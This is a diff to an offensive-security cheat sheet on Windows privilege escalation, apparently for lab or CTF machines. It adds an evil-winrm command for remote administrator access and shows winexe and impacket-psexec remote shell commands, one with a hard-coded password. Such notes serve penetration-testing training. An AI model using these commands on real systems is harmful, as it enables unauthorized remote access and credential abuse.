@@ -648,7 +648,7 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
 **Check general host information with** ```systeminfo; net users; net localgroups; netstat -ano; ipconfig /all; tasklist```
 
-
+**Check C:\Users\$USER\AppData folder**
 
 **Auto enumerate with (enum script of choice here:)** ```winPEAS.exe```
 
@@ -662,6 +662,9 @@ winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
 ```
 impacket-psexec $USERNAME:'$PASSWORD'@$RHOST powershell
 ```
+
+**If WinRM (Windows Remote Management) is open, use evil-winrm with creds to gain access**\
+```ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.27 -u administrator -p '$PASSWORD'```
 
 **If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe**
 ```
